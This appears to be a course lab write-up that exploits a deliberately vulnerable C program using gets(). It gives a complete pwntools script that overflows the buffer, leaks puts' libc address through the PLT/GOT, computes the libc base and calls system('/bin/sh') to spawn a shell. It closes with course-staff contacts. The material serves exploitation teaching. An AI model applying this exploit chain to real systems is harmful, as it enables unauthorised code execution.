###### Vulnreable Code:
```
#include <stdio.h>
void vuln() {
    puts("Come get me");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```
# Analysis
We'll have to leak the ASLR base.
# Exploitation:
###### Code setup:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```
Now we need to send a payload that leaks the real address of puts.
Calling the PLT entry of a function is the same as calling the function itself; if we point the parameter to the GOT entry, it will print the actual location
	In C, string arguments for functions take a **pointer** to where the string can be found, so pointing it to the GOT entry will print it out.

```python
p.recvline()        # just receive the first output

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
```
The call to `main` is there so that it doesn't crash after we leak the libc base
```python
p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)
```
This will actually print more than just the GOT entry, it will print until a `null` byte. We only care about the first four bytes (8 if this were base64), and we can interpret them using `u32()`

From here, we simply calculate libc base again and perform a basic ret2libc:
```
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],            # exit is not required here, it's just nicer
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

## Final Exploit:
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

- [@Ian Dupont](https://cyberoffensiv-xd79945.slack.com/team/U01LCRFCLMR) - questions about homework, grading, and really anything
- [@Allen Qiu](https://cyberoffensiv-xd79945.slack.com/team/U06E03EL24S) - questions about homework, office hours
- [@Jia Yu Chan](https://cyberoffensiv-xd79945.slack.com/team/U04KM0Q5PTR) - questions about homework, review sessions

